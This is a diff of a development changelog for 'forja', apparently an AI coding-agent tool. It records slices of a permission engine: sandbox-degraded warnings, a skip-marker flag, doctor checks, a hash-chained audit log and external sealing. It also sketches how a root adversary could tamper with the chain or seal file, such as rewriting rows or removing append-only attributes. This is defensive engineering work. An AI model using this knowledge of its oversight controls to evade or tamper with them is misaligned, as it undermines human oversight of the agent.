+| `src/tui/harness-adapter.ts` | New `case 'sandbox_degraded_active'` in the translate switch. Emits THREE `warn` UIEvents: headline ("⚠ Sandbox no longer available [reason]" on firstEmission, "⚠ Sandbox still unavailable [reason]" on recurring), an effect line ("All tool calls now require manual confirmation."), and a recovery hint ("Run 'forja doctor' to investigate."). Matches the spec's example output verbatim. |
 | `tests/permissions/degraded-banner.test.ts` (new, 14 tests) | **State transitions (4):** ready → no emissions; first degraded call → immediate emit + `firstEmission: true`; recurring fires every Nth after first; default `intervalCalls = 10`. **Reset on transition back (1):** degraded → ready → degraded re-fires `firstEmission: true` + counter resets (next emission after N MORE calls). **Reason + ts (3):** reason from `getReason` callback flows into events; omitted defaults to empty string; `now()` seam pinned via incrementing counter. **Non-degraded states (2):** `refusing` and `loading-policy` do NOT trigger emissions. **Argument validation (3):** `intervalCalls < 1`, `1.5` (non-integer) throw; `intervalCalls = 1` valid (fires every call after first). **Per-call sessionId (1):** sessionId from `notifyToolCall` flows into event verbatim. |
 
 ### Decisions
@@ -16291,7 +17595,7 @@ PERMISSION_ENGINE.md remaining items:
 
 ## [2026-05-11] permission-engine-v2 — slice 91: §13.5 sandbox_skip marker (`--i-know-what-im-doing`)
 
-**Done.** Ninety-first slice. Closes the §13.5 first-boot UX gap from the slice-90 audit: operators who explicitly want to suppress the sandbox-setup re-prompt across sessions can now pass `agent welcome --i-know-what-im-doing` to create the `~/.config/forja/sandbox_skip` marker. Subsequent sessions read the marker and skip the prompt silently — but engine enforcement (degraded state, per-call confirm) is unaffected.
+**Done.** Ninety-first slice. Closes the §13.5 first-boot UX gap from the slice-90 audit: operators who explicitly want to suppress the sandbox-setup re-prompt across sessions can now pass `forja welcome --i-know-what-im-doing` to create the `~/.config/forja/sandbox_skip` marker. Subsequent sessions read the marker and skip the prompt silently — but engine enforcement (degraded state, per-call confirm) is unaffected.
 
 Pre-slice the welcome flow re-prompted on every session when sandbox was missing. The spec calls this out explicitly (line 893): "Nunca há opção silenciosa 'skip and don't ask again'. Re-prompt em toda sessão se sandbox continua ausente; suprimível só com `~/.config/forja/sandbox_skip` criado via `--i-know-what-im-doing`." Slice 91 implements that suppression mechanism.
 
@@ -16314,15 +17618,15 @@ The slice DELIBERATELY does NOT couple the marker to the existing `unsafe_mode_a
 | `src/cli/welcome.ts` | Imports the new helpers. `RunWelcomeOptions` adds `iKnowWhatImDoing?: boolean` + two test seams (`hasSkipMarker`, `createSkipMarker`). Sandbox-setup section now has three branches: (1) `iKnowWhatImDoing === true` → invoke `createSkipMarker` + emit "Marker created/already at ${path}" line + "Engine enforcement is unchanged" reassurance, skip `runSandboxSetup`; (2) marker present (no flag) → emit "Sandbox setup skipped — marker present" + "Remove that file to re-enable" hint, skip `runSandboxSetup`; (3) normal path → `runSandboxSetup` as before. |
 | `src/cli/run.ts` | When `args.welcome === true`, forwards `iKnowWhatImDoing` to `runWelcome` via conditional spread (preserves `exactOptionalPropertyTypes`). |
 | `tests/cli/sandbox-skip.test.ts` (new, 8 tests) | **`sandboxSkipPath` (3):** XDG_CONFIG_HOME takes precedence; missing → HOME fallback; empty → HOME fallback. **`hasSandboxSkip` (2):** exists branch + missing branch. **`createSandboxSkip` (3):** writes the marker when absent with full body shape (timestamp + version + ack text); body contains the "does NOT bypass enforcement" disclaimer; idempotent on already-present (skips ensureDir + write). |
-| `tests/cli/welcome.test.ts` | **+7 tests** under `parseArgs — agent welcome --i-know-what-im-doing` (3) and `runWelcome — §13.5 sandbox_skip` (4): args parsing captures the flag; omitted → undefined; unknown flag rejected with updated error message. Flag + no marker → create called + "Marker created at" line + setup body skipped. Flag + marker already present → create still called (returns ok created:false) + "Marker already at" + "stay silenced". No flag + marker present → silently skip + "marker present" hint + create NOT called. No flag + no marker → setup runs (no marker text in output). |
+| `tests/cli/welcome.test.ts` | **+7 tests** under `parseArgs — forja welcome --i-know-what-im-doing` (3) and `runWelcome — §13.5 sandbox_skip` (4): args parsing captures the flag; omitted → undefined; unknown flag rejected with updated error message. Flag + no marker → create called + "Marker created at" line + setup body skipped. Flag + marker already present → create still called (returns ok created:false) + "Marker already at" + "stay silenced". No flag + marker present → silently skip + "marker present" hint + create NOT called. No flag + no marker → setup runs (no marker text in output). |
 
 ### Decisions
 
-- **Marker creation is one-shot per session via the flag.** Running `agent welcome --i-know-what-im-doing` creates the marker; subsequent sessions without the flag READ the marker. Operators who want to suppress AND continue unsafe-mode (banner) chain into the existing option [3] flow — those are separate UX surfaces.
+- **Marker creation is one-shot per session via the flag.** Running `forja welcome --i-know-what-im-doing` creates the marker; subsequent sessions without the flag READ the marker. Operators who want to suppress AND continue unsafe-mode (banner) chain into the existing option [3] flow — those are separate UX surfaces.
 - **`sandboxSkipPath` honors `env.HOME` before `homedir()` system call.** Tests can pin a synthetic path by passing `env`; production runtime falls through to the real `homedir()` if env wasn't overridden. Matches existing patterns in `src/permissions/paths.ts`.
 - **Marker file content is human-readable, NOT machine-parsed.** Body has commented metadata (timestamp + version + acknowledgment block). `hasSandboxSkip` only checks file existence — contents are operator-readable diagnostics. A future verifier could parse the timestamp for audit retention, but slice 91 doesn't.
 - **Idempotency: re-creating an existing marker returns `created: false`, skips ensureDir + write entirely.** Preserves the original timestamp so audits see WHEN the operator first acknowledged, not the most recent invocation. Welcome's UX message disambiguates "Marker created" vs "Marker already at" so operators see whether the flag had an effect.
-- **`--i-know-what-im-doing` accepted ONLY in the `welcome` subcommand, not top-level.** Top-level `agent --i-know-what-im-doing "your prompt"` is meaningless — there's no welcome flow running. The flag's only valid context is the welcome subcommand; rejecting it elsewhere keeps the surface clean.
+- **`--i-know-what-im-doing` accepted ONLY in the `welcome` subcommand, not top-level.** Top-level `forja --i-know-what-im-doing "your prompt"` is meaningless — there's no welcome flow running. The flag's only valid context is the welcome subcommand; rejecting it elsewhere keeps the surface clean.
 - **Test exit-code assertion REMOVED from the flag-creates-marker test.** Doctor returns 1 in synthetic test envs (no $HOME, missing config dir, etc.) for reasons unrelated to the marker flow. The marker contract is what slice 91 needs to assert; the exit-code assertion was incidental + brittle. Comment in the test documents this.
 - **`createSandboxSkip` returns `{path, created}` rather than throwing on already-present.** Callers consistently want to differentiate "first-time acknowledgment" from "already silent" in their UX message. Throw would force try/catch boilerplate; the discriminated return is cleaner.
 - **No corresponding `clearSandboxSkip` helper.** Operators who want to remove the marker `rm` the file directly. Adding a helper would imply Forja owns the lifecycle; the spec's intent is that the marker is operator-owned + transparent.
@@ -16346,7 +17650,7 @@ After slice 92, PERMISSION_ENGINE.md will have only two non-code remaining items
 
 **Done.** Ninetieth slice. Expands `forja doctor` to cover the spec's §13.3 kernel-state matrix: user namespaces, nftables, SELinux/AppArmor. Adds a derived "capability ceiling" footer that shows the sandbox profile set reachable on the current host, plus an "engine version" footer read from `package.json`. Closes the last partial section of `PERMISSION_ENGINE.md` — every named section now has a corresponding implementation.
 
-Pre-slice, `agent doctor` covered the userspace surface (sandbox binary, config + data dirs, policy load, hash chain, sealing, git) but missed the kernel-side dependencies that determine WHICH sandbox profiles the engine can actually pick. An operator with bwrap installed but `unprivileged_userns_clone = 0` (sysadmin-disabled) saw `sandbox: ok` followed by mysterious bwrap failures at runtime. Slice 90 surfaces that root cause directly.
+Pre-slice, `forja doctor` covered the userspace surface (sandbox binary, config + data dirs, policy load, hash chain, sealing, git) but missed the kernel-side dependencies that determine WHICH sandbox profiles the engine can actually pick. An operator with bwrap installed but `unprivileged_userns_clone = 0` (sysadmin-disabled) saw `sandbox: ok` followed by mysterious bwrap failures at runtime. Slice 90 surfaces that root cause directly.
 
 ### Why this matters
 
@@ -16356,7 +17660,7 @@ Spec §13.2 catalogues the support tiers — each tier defines a `capability_cei
 - **nftables** (`nft` binary): the `cwd-rw-net` profile uses nft to filter egress per the resolved capability set. Without it, net-profile gates degrade to host.
 - **MAC LSM** (SELinux or AppArmor): not strictly required, but Enforcing mode adds defense in depth. Permissive/Disabled is a known weaker posture.
 
-Pre-slice, these three states were invisible until something failed at runtime. Now `agent doctor` reports each as a discrete check + adds a derived capability ceiling line so operators see at a glance which profiles their engine can actually plan.
+Pre-slice, these three states were invisible until something failed at runtime. Now `forja doctor` reports each as a discrete check + adds a derived capability ceiling line so operators see at a glance which profiles their engine can actually plan.
 
 The §13.3 spec also calls for an "engine version" + "conformance suite N/N" footer. Engine version lands in slice 90 (read from package.json once at module load); conformance suite reporting is out of scope (would require persisting pass counts across test runs — a CI-side concern).
 
@@ -16579,7 +17883,7 @@ The spawn broker's sandbox runner closes over `maybeWrapSandboxArgv` (the §6.5 
 - **CLI flag only, no config file / env var.** Operators who want the upgrade today pass `--broker spawn` per invocation. A `[broker] mode = "spawn"` in `agent.toml` is a natural follow-up, but the CLI flag is the minimum-viable surface. The flag IS the override; the config file would be the default. Both can coexist.
 - **Default stays `in-process` for slice 87.** Flipping the default to `spawn` is a separate decision — it requires (a) confidence that the spawn broker's sandbox + timeout + cancellation paths are production-tuned, (b) binary-mode support so compiled binaries don't break, (c) consideration of the per-call spawn cost (fork overhead ~ms, acceptable for interactive use). Slice 87 ships the SURFACE; the flip can happen post-slice without the user noticing if everything else is right.
 - **Compiled-binary mode surfaces a clear error, not a silent fallback.** When `import.meta.dir` resolves to an embedded path that `bun run` can't address, the constructed `createSpawnBroker` would fail at first execute with "spawn failed: ENOENT". That diagnosis is poor: operators see `bash.spawn_failed` and don't know it's the worker entry, not bash itself. Pre-flighting `existsSync(workerPath)` + throwing at bootstrap surfaces the right cause + suggests the fallback ("Re-run with --broker in-process or from a source checkout").
-- **`workerPath` resolved via `import.meta.dir`, not relative to cwd.** Operators invoke `agent` from any directory; cwd-relative `src/broker/worker.ts` would only work from the repo root. `import.meta.dir` gives the directory of the bootstrap.ts module, which sits next to `src/broker/`. `resolve(import.meta.dir, '../broker/worker.ts')` is the canonical sibling-import pattern.
+- **`workerPath` resolved via `import.meta.dir`, not relative to cwd.** Operators invoke `forja` from any directory; cwd-relative `src/broker/worker.ts` would only work from the repo root. `import.meta.dir` gives the directory of the bootstrap.ts module, which sits next to `src/broker/`. `resolve(import.meta.dir, '../broker/worker.ts')` is the canonical sibling-import pattern.
 - **`sandboxRunner` closure over `maybeWrapSandboxArgv`, NOT direct binding.** The broker passes `{profile: string, cwd, innerArgv}`; `maybeWrapSandboxArgv` wants `{profile: SandboxProfile, cwd, innerArgv}`. The closure handles the cast at the boundary. Direct binding would require widening the runner type signature on the broker side, which would dilute the typed boundary. The cast is narrowly scoped + documented inline.
 - **Per-call timeoutMs default `60_000` on the spawn broker.** Pre-slice 85 the spawn broker had no default; slice 87 sets `60_000` to give bash + handler startup + bwrap setup a reasonable ceiling. Bash tool's per-call override (slice 85) widens this for long-running commands — 60s is the floor, not the cap.
 - **No telemetry sink wired in slice 87.** Slice 84 ships `worker.crashed` emit logic on the spawn broker; slice 87 doesn't construct a sink. Operators who want telemetry construct it externally and pass via a future config knob. Wiring a default sink (JSONL to stderr? a file? OTEL?) is its own operator-facing decision; ducking it keeps slice 87 focused. The infrastructure is ready when the design is.
@@ -16598,7 +17902,7 @@ The spawn broker's sandbox runner closes over `maybeWrapSandboxArgv` (the §6.5 
 
 §13.7 architectural thread COMPLETE. The broker stack works end-to-end with operator-selectable isolation mode. Remaining concerns are operational / deployment, not architectural:
 
-1. **Binary-mode worker invocation.** `bun build --compile` packages source into a single executable; `bun run src/broker/worker.ts` doesn't work post-compile. Options: (a) make the binary itself a worker via a subcommand (`agent --broker-worker`); (b) Bun's sea-config to embed worker.ts as a fetchable asset; (c) skip — operators run dev binaries for the security mode until packaging matures. Slice 87 throws a clear error in compiled mode; the fix is a packaging slice, not §13.7.
+1. **Binary-mode worker invocation.** `bun build --compile` packages source into a single executable; `bun run src/broker/worker.ts` doesn't work post-compile. Options: (a) make the binary itself a worker via a subcommand (`forja --broker-worker`); (b) Bun's sea-config to embed worker.ts as a fetchable asset; (c) skip — operators run dev binaries for the security mode until packaging matures. Slice 87 throws a clear error in compiled mode; the fix is a packaging slice, not §13.7.
 2. **Telemetry sink wiring in bootstrap.** Slice 84 ships emit logic; slice 87 leaves the sink unset. A future slice constructs a default sink (JSONL to a configurable destination) and threads via the same `[broker]` config the mode flag will eventually live in.
 3. **Default flip from `in-process` to `spawn`.** Hold until binary-mode + telemetry + operator-tuned timeouts are settled. Currently `--broker spawn` is opt-in; default flip would make it the path everyone takes.
 
@@ -17488,7 +18792,7 @@ Other open work unchanged: §7.3 backends (s3-object-lock + rfc3161-tsa), §13.7
 
 ### Why this matters
 
-Per §18 line 1213, the metric `chain_verification_failures_total > 0` is a P0 alarm — without telemetry, operators only see chain breaks when `agent permission verify` is run manually or when bootstrap refuses. The same applies to sealing failures, classifier unavailability, state transitions, and approval-rate drift. Spec line 1207-1213 lists seven metric streams that need OTEL export; this slice doesn't wire any external adapter, but it establishes the event surface that adapters consume.
+Per §18 line 1213, the metric `chain_verification_failures_total > 0` is a P0 alarm — without telemetry, operators only see chain breaks when `forja permission verify` is run manually or when bootstrap refuses. The same applies to sealing failures, classifier unavailability, state transitions, and approval-rate drift. Spec line 1207-1213 lists seven metric streams that need OTEL export; this slice doesn't wire any external adapter, but it establishes the event surface that adapters consume.
 
 The `permission.decision` event is the highest-volume + most-load-bearing — every audit emit produces one. Wiring it FIRST lets follow-up slices (OTEL adapter, scrubbing layer) be tested against real telemetry traffic rather than synthetic events. The recording sink in slice 70 also unlocks future operator-facing surfaces like `agent telemetry tail` (a `tail -f` for in-process events).
 
@@ -17870,7 +19174,7 @@ The `factoryForSealMode` dispatcher is a small refactor that pays for itself THI
 - **Wire format byte-identical between worm-file and git-anchored.** Same `seq=<n>\tts=<n>\thash=<H>\n` lines, same parser, same `verifySealAgainstChain`. The backend dimension is "how the file is made append-only" (chattr vs git commit), not "how entries are encoded". A future operator switching backends keeps their existing seal files readable.
 - **Per-entry commits, not batched.** Spec line 573 says "hash periódico commitado em repo separado" — "periodic" maps naturally to the scheduler's `interval_decisions` / `interval_seconds`. Per-entry commits give the operator one git commit per seal event, which is also one row per audit interval. `git log` becomes the seal trail directly readable by humans. Batched commits would amortize cost but obscure the timeline.
 - **No `push` step in slice 63.** Pushing to a remote on every append is the spec-recommended audit-grade configuration but adds network failure modes + credential management to the sealer. Operator pushes via cron or post-session hook (`git -C <repo> push`). Future slice can add a `push: true` opt-in field; for now, local commits are the contract.
-- **`config.path` polymorphic per mode, not a per-mode field.** Schema dimension stays flat (worm-file: `path: /var/log/agent/seal.log`; git-anchored: `path: /var/audit/seal-repo`). Different field names (`file_path` vs `repo_path`) would force operators to relearn the schema per backend; semantic overloading via `path` keeps YAML samples consistent. Backend-specific labels in CLI output disambiguate (`file: <path>` vs `repo: <path>` in seal-verify).
+- **`config.path` polymorphic per mode, not a per-mode field.** Schema dimension stays flat (worm-file: `path: /var/log/forja/seal.log`; git-anchored: `path: /var/audit/seal-repo`). Different field names (`file_path` vs `repo_path`) would force operators to relearn the schema per backend; semantic overloading via `path` keeps YAML samples consistent. Backend-specific labels in CLI output disambiguate (`file: <path>` vs `repo: <path>` in seal-verify).
 - **`factoryForSealMode` returns `null` for `'none'`, not a sentinel factory.** Sealing being off is a distinct state from "configured but unknown mode" — null is the natural signal. Consumers check `if (factory === null)` and treat as "no factory" (which equals "sealing disabled" for none, and "unsupported_mode error" for an unwired future mode).
 - **`exec` test seam takes `(cmd, args, opts)` matching `execFileSync` shape.** Production: shells out to `/usr/bin/git`. Tests: capture into array, optionally `failGitAt('add' | 'commit', reason)` to simulate git failures at specific subcommands. Mirrors the chattr seam shape from worm-file's `onCreate`.
 - **No `git init` autorun.** Operator pre-initializes the repo. Auto-init would be surprising side effect (created `.git/` in a path the operator hadn't yet vetted) and would invite "engine accidentally clobbered my work tree" bug reports. The sealer fails loudly on first append when the repo isn't initialized (git add returns "not a git repository") and the failure routes through `onSealFailed` → state machine per `seal.on_failure`.
@@ -17894,11 +19198,11 @@ Other open work unchanged: §13.7 broker/worker (biggest remaining thread), §19
 
 ## [2026-05-11] permission-engine-v2 — slice 62: `forja doctor` hash_chain integrity check (§7.2 + §13.3 line 804)
 
-**Done.** Sixty-second slice. Closes another spec-canonical doctor line: hash chain integrity. Spec line 1212 marks `chain_verification_failures_total > 0 = P0`, so chain breaks are the highest-severity signal doctor surfaces. The check mirrors `agent permission verify` but renders one-line doctor-shaped output (`intact (5 rows)` / `BROKEN at seq 2: this_hash_mismatch`) instead of the verify command's full forensic dump.
+**Done.** Sixty-second slice. Closes another spec-canonical doctor line: hash chain integrity. Spec line 1212 marks `chain_verification_failures_total > 0 = P0`, so chain breaks are the highest-severity signal doctor surfaces. The check mirrors `forja permission verify` but renders one-line doctor-shaped output (`intact (5 rows)` / `BROKEN at seq 2: this_hash_mismatch`) instead of the verify command's full forensic dump.
 
 ### Why this matters
 
-The audit chain is §7.2's load-bearing security invariant — every decision links to the previous via `prev_hash`. Tampering with any past row breaks the chain at verify-time. Without doctor surfacing this, operators only learn about chain breaks when they explicitly run `agent permission verify` OR when the engine refuses to bootstrap (chain-broken refusing state). Doctor's job is the pre-flight: chain integrity at `forja doctor` time means an operator can catch tampering BEFORE the next session, BEFORE any new audit row anchors on a corrupted prev_hash.
+The audit chain is §7.2's load-bearing security invariant — every decision links to the previous via `prev_hash`. Tampering with any past row breaks the chain at verify-time. Without doctor surfacing this, operators only learn about chain breaks when they explicitly run `forja permission verify` OR when the engine refuses to bootstrap (chain-broken refusing state). Doctor's job is the pre-flight: chain integrity at `forja doctor` time means an operator can catch tampering BEFORE the next session, BEFORE any new audit row anchors on a corrupted prev_hash.
 
 Empty / no-DB cases land as `ok` not `warn`. Fresh installs and operators between sessions legitimately have no chain rows yet — the engine hasn't emitted anything. Treating these as warnings would be noisy and unactionable; the first session's emit creates the DB and starts the chain naturally.
 
@@ -17918,7 +19222,7 @@ Empty / no-DB cases land as `ok` not `warn`. Fresh installs and operators betwee
 - **Singular "row" vs plural "rows".** Cosmetic but worth doing — small consistency win that makes doctor output read naturally for chains with exactly 1 row (first-emit state). Same convention as the sealing check's "1 entry" / "N entries" from slice 60.
 - **`rotation_id` rendered only when non-zero.** Chains that never rotated have `current_rotation_id = 0`; including it in the line would be noise. Rotated chains render `intact (5 rows, rotation_id=2)` so operators see the rotation provenance.
 - **Position BETWEEN policy_load (5) and sealing (7) — index 6.** Spec line 803-805 orders Policy load → Hash chain → External sealing. Following spec ordering keeps the canonical output recognizable. Also functional: sealing depends on chain rows (the seal entries point AT chain hashes), so chain integrity is logically the prerequisite.
-- **Remediation text quotes the exact CLI commands operators should run.** "run `agent permission verify` for full diagnostic" / "run `agent permission rotate-chain --reason <text>`" — operators can copy-paste. Same posture as the sealing check's `seal-verify` / `seal-now` references. Doctor is the entry point; the verbs are where the work happens.
+- **Remediation text quotes the exact CLI commands operators should run.** "run `forja permission verify` for full diagnostic" / "run `forja permission rotate-chain --reason <text>`" — operators can copy-paste. Same posture as the sealing check's `seal-verify` / `seal-now` references. Doctor is the entry point; the verbs are where the work happens.
 
 ### Verification
 
@@ -17933,7 +19237,7 @@ Empty / no-DB cases land as `ok` not `warn`. Fresh installs and operators betwee
 
 1. **Classifier health** (line 806) — would need the engine's classifier subsystem to expose a `last_response_ms` / `last_seen_at` metric. Couple-line slice once the metric exists; classifier slice (§6.4) doesn't currently track this.
 2. **Engine state** (line 807) — doctor is pre-engine; surfacing "engine state: ready" would require a separate read of the last bootstrap event (e.g., from a `bootstrap_state` table or audit row). Slice scope likely needs spec clarification on where the source-of-truth lives.
-3. **Conformance suite last-run** (line 811) — operational metric, not derived from engine state. Likely tracked in a separate file (e.g., `.agent/conformance.json`) written by CI. Would need the CI emission slice first.
+3. **Conformance suite last-run** (line 811) — operational metric, not derived from engine state. Likely tracked in a separate file (e.g., `.forja/conformance.json`) written by CI. Would need the CI emission slice first.
 
 These are nice-to-have rather than spec-blocking. Other open work unchanged: §7.3 backends (git-anchored simplest), §13.7 broker/worker (biggest remaining thread), §19 migration, §14 MCP (blocked), macOS SBPL conformance extension, fuzz harness, telemetria.
 
@@ -17947,7 +19251,7 @@ These are nice-to-have rather than spec-blocking. Other open work unchanged: §7
 
 ### Why this matters
 
-Doctor's role is the pre-flight surface — operators run it before sessions, after config changes, when something feels off. Per-layer policy status is one of the most-needed diagnostics: "I edited `~/.config/agent/permissions.yaml`, is it actually being read?" Without this check, operators had to bootstrap a session and inspect `agent perms` to confirm. With it, `forja doctor` answers in one line.
+Doctor's role is the pre-flight surface — operators run it before sessions, after config changes, when something feels off. Per-layer policy status is one of the most-needed diagnostics: "I edited `~/.config/forja/permissions.yaml`, is it actually being read?" Without this check, operators had to bootstrap a session and inspect `agent perms` to confirm. With it, `forja doctor` answers in one line.
 
 Lock conflicts are the secondary value: a higher layer's `locked: true` rejecting a lower layer's attempted override is a real config-hygiene signal. The policy still loads (lower-layer change is dropped), so it's a `warn` not a `fail`, but the operator should know — the lower-layer YAML is doing nothing.
 
@@ -18078,17 +19382,17 @@ The most interesting case is #5 — interleaved reload + emit. Each row's `polic
 
 ---
 
-## [2026-05-11] permission-engine-v2 — slice 58: `agent permission seal-now` + `seal-verify` CLI verbs
+## [2026-05-11] permission-engine-v2 — slice 58: `forja permission seal-now` + `seal-verify` CLI verbs
 
-**Done.** Fifty-eighth slice. Ships the operator-facing CLI surface for §7.3: `agent permission seal-now` flushes a manual seal entry (for scripts before SIGTERM, cron, or batch jobs that don't hold the engine resident long enough to hit `interval_seconds`); `agent permission seal-verify` cross-references the external seal file against the live audit chain. Both verbs are DB-only — they don't bootstrap the engine, just read the active policy for `seal.mode`, build the matching `SealStore`, and run the underlying primitives from slices 54-55.
+**Done.** Fifty-eighth slice. Ships the operator-facing CLI surface for §7.3: `forja permission seal-now` flushes a manual seal entry (for scripts before SIGTERM, cron, or batch jobs that don't hold the engine resident long enough to hit `interval_seconds`); `forja permission seal-verify` cross-references the external seal file against the live audit chain. Both verbs are DB-only — they don't bootstrap the engine, just read the active policy for `seal.mode`, build the matching `SealStore`, and run the underlying primitives from slices 54-55.
 
 With this slice, the §7.3 thread is **closed end-to-end**: automatic sealing via the scheduler (slices 54-57) + manual sealing via the CLI (slice 58) + integrity verification via both `permission verify` (chain, pre-existing) and `permission seal-verify` (seal file vs chain, this slice).
 
 ### Why this matters
 
-Slice 57 made sealing AUTOMATIC. Manual sealing is the safety valve for two real scenarios. (a) **Script termination**: a CI job calling `agent` for batch work might exit before the scheduler's `interval_seconds` fires; without a final `seal-now`, the last decisions go unsealed. (b) **Forensic flush**: an operator suspecting tampering wants a fresh seal entry pinning the current chain head NOW, not at the next scheduled interval — that snapshots the chain state at a defensible moment.
+Slice 57 made sealing AUTOMATIC. Manual sealing is the safety valve for two real scenarios. (a) **Script termination**: a CI job calling `forja` for batch work might exit before the scheduler's `interval_seconds` fires; without a final `seal-now`, the last decisions go unsealed. (b) **Forensic flush**: an operator suspecting tampering wants a fresh seal entry pinning the current chain head NOW, not at the next scheduled interval — that snapshots the chain state at a defensible moment.
 
-`seal-verify` is the complement to `agent permission verify`. Chain-verify checks the SQLite chain itself; seal-verify checks that the EXTERNAL seal file matches the chain at every recorded point. A divergence flags either chain tampering (DB rows rewritten with recomputed hashes) OR seal-file tampering (`chattr -a` first, then edit). The two together close the audit-grade loop: chain intact + seal file matches = the chain hasn't been tampered with even by a root adversary who rewrote everything.
+`seal-verify` is the complement to `forja permission verify`. Chain-verify checks the SQLite chain itself; seal-verify checks that the EXTERNAL seal file matches the chain at every recorded point. A divergence flags either chain tampering (DB rows rewritten with recomputed hashes) OR seal-file tampering (`chattr -a` first, then edit). The two together close the audit-grade loop: chain intact + seal file matches = the chain hasn't been tampered with even by a root adversary who rewrote everything.
 
 ### Surface
 
@@ -18107,11 +19411,11 @@ Slice 57 made sealing AUTOMATIC. Manual sealing is the safety valve for two real
 ### Decisions
 
 - **Hoist `defaultWormFileFactory` to `sealing.ts`, not duplicate per consumer.** Bootstrap and both CLI verbs need the same factory. Duplication means a future change (alternate chattr path, lsattr check on existing files) would land in 3+ places. Single canonical export in `sealing.ts` co-located with `createWormFileSealer` keeps the cohesion obvious. The factory takes `SealPolicy` (not just `path`) so future fields (`endpoint` for TSA, `bucket` for S3) work uniformly across backends.
-- **Both verbs are DB-only (no engine bootstrap).** Same posture as `agent permission verify`: read the policy from cwd/HOME, open the DB read-only-style (we do write for seal-now, but never via the engine's sink), do the work, exit. Avoids the cost + complexity of starting a session for a one-shot CLI invocation. Matches `verify` / `replay` / `policy-list` / `policy-rollback`.
+- **Both verbs are DB-only (no engine bootstrap).** Same posture as `forja permission verify`: read the policy from cwd/HOME, open the DB read-only-style (we do write for seal-now, but never via the engine's sink), do the work, exit. Avoids the cost + complexity of starting a session for a one-shot CLI invocation. Matches `verify` / `replay` / `policy-list` / `policy-rollback`.
 - **seal-now's already-sealed check uses `store.list()`, not a separate state file.** The seal store IS the source of truth for "what's sealed". Reading `store.list()` and comparing the last entry's seq is O(N) but cheap (the seal file is tiny — one line per interval, so even at `interval_decisions=1` and 100k decisions, parsing 100k lines is microseconds). Adding a separate "last-sealed-seq" cache would invite drift bugs.
 - **Both verbs reject `--reason`, both reject positionals.** Verbs that take no arguments should fail loudly on stray flags rather than silently accept them — a `--reason "before-prod-cutover"` typo'd into seal-verify would otherwise pass parse and be silently ignored, leaving the operator wondering whether the reason landed somewhere. Same posture as `policy-list`.
-- **`seal-now` exits 0 on noops (chain_empty, already_sealed), not 1.** Exit codes 0 = "the requested operation completed successfully OR there's nothing to do"; 1 = "something went wrong and the operator should investigate". Scripts running `agent permission seal-now && rm -rf /tmp/scratch` shouldn't fail just because the chain happens to be empty.
-- **JSON output uses a single NDJSON line, not pretty-printed.** Pipeline-composable: `agent permission seal-verify --json | jq` works. Matches the `permission verify` precedent. Operators wanting human-readable output drop `--json`.
+- **`seal-now` exits 0 on noops (chain_empty, already_sealed), not 1.** Exit codes 0 = "the requested operation completed successfully OR there's nothing to do"; 1 = "something went wrong and the operator should investigate". Scripts running `forja permission seal-now && rm -rf /tmp/scratch` shouldn't fail just because the chain happens to be empty.
+- **JSON output uses a single NDJSON line, not pretty-printed.** Pipeline-composable: `forja permission seal-verify --json | jq` works. Matches the `permission verify` precedent. Operators wanting human-readable output drop `--json`.
 - **`seal-verify` reports `firstMismatchAt` rather than walking all mismatches.** Once the chain diverges, every entry after the first tamper looks mismatched against a re-hashed sub-chain. Reporting all would cascade noise; first mismatch is the actionable signal.
 - **No top-level chattr presence check in the default factory.** On non-Linux platforms, the factory's `onCreate` call to `execFileSync('/usr/bin/chattr', ...)` throws → sealer returns ok:false → CLI verb renders the error. Pre-checking `which chattr` would be a second call, slightly slower, and the error would arrive at a different code path; the natural failure path through execFileSync is fine. Operators on macOS / BSD see "chattr +a failed" clearly and either install the binary or pick a different sealing mode (when more backends ship).
 
@@ -18137,7 +19441,7 @@ Other open spec gaps unchanged (§19 v1→v2 migration, macOS sandbox-exec confo
 
 **Done.** Fifty-seventh slice. Closes the operator-facing surface of §7.3: a `seal:` mapping in `permissions.yaml` now configures real sealing behavior end-to-end. The schema (slice 57 in `types.ts`) is parsed (config.ts), merged across layers (hierarchy.ts), and consumed by the bootstrap (bootstrap-engine.ts) which constructs the `SealStore` + `SealingScheduler` and wires the scheduler's `onSealFailed` into the engine's state machine. `on_failure: degrade|refuse` becomes a real transition path: a chattr failure in production trips the engine, and operators see the state change in the events log.
 
-With this slice, the §7.3 thread is **closed for the worm-file backend**: operator writes `seal: { mode: worm-file, path: /var/log/agent/seal.log, on_failure: refuse }` → the bootstrap runs `/usr/bin/chattr +a` on the path → every audit emit ticks the scheduler → seals land at the configured interval → seal failure transitions to refusing.
+With this slice, the §7.3 thread is **closed for the worm-file backend**: operator writes `seal: { mode: worm-file, path: /var/log/forja/seal.log, on_failure: refuse }` → the bootstrap runs `/usr/bin/chattr +a` on the path → every audit emit ticks the scheduler → seals land at the configured interval → seal failure transitions to refusing.
 
 ### Why this matters
 
@@ -18181,7 +19485,7 @@ The state-machine integration is the security-critical correctness property: spe
 
 §7.3 thread is **closed for the worm-file backend**: primitive (54) + scheduler (55) + audit-sink integration (56) + Policy section + bootstrap wire-up (57). What's left:
 
-1. **Slice 58**: CLI verbs — `agent permission seal-now` (manual flush, e.g. before SIGTERM in scripts), `agent permission seal-verify` (runs `verifySealAgainstChain` and renders the result). Small slice — both verbs already have the underlying functions; this is just the argv-parsing + output rendering.
+1. **Slice 58**: CLI verbs — `forja permission seal-now` (manual flush, e.g. before SIGTERM in scripts), `forja permission seal-verify` (runs `verifySealAgainstChain` and renders the result). Small slice — both verbs already have the underlying functions; this is just the argv-parsing + output rendering.
 2. Additional sealing backends (`s3-object-lock`, `rfc3161-tsa`, `git-anchored`) — each becomes an independent slice with its own `SealStore` factory + parse-side support (unblocking the reserved-mode error). Production-readiness checklist demands "≥ 1 backend"; worm-file already satisfies that, so other backends are nice-to-have rather than blockers.
 
 Other open spec gaps unchanged (§19 v1→v2 migration, macOS sandbox-exec conformance, §13.7 broker/worker, §14 MCP). §16.2 conformance still at 95%.
@@ -18322,7 +19626,7 @@ This slice is the worm-file primitive — the simplest of the four sealing modes
 1. **Slice 55**: Sealing scheduler — `createSealingScheduler({store, db, intervalDecisions, intervalSeconds, now, onSealFailed})` fires per the §7.3 config (`interval_decisions = 100` and/or `interval_seconds = 3600`, whichever first), pulls the latest chain row from `getLastApprovalsLogByInstall`, calls `store.append`. Same test-seam pattern as the watcher.
 2. **Slice 56**: Audit sink integration — `createSqliteSink` accepts an optional `scheduler` parameter; every `emit` ticks the scheduler so the decision count drives the interval.
